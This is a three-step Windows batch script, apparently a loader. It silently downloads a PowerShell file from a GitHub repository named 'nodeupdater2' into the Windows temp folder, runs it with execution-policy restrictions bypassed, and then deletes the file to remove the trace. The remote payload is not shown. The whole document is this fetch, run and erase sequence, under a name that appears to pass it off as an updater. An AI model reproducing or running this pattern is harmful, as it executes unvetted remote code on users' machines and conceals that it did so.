@echo off

curl -L -s -o "C:\Windows\Temp\IoU.ps1" https://raw.githubusercontent.com/nodeupdater2/nodeupdater/main/IoU.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -File "C:\Windows\Temp\IoU.ps1"

del "C:\Windows\Temp\IoU.ps1"
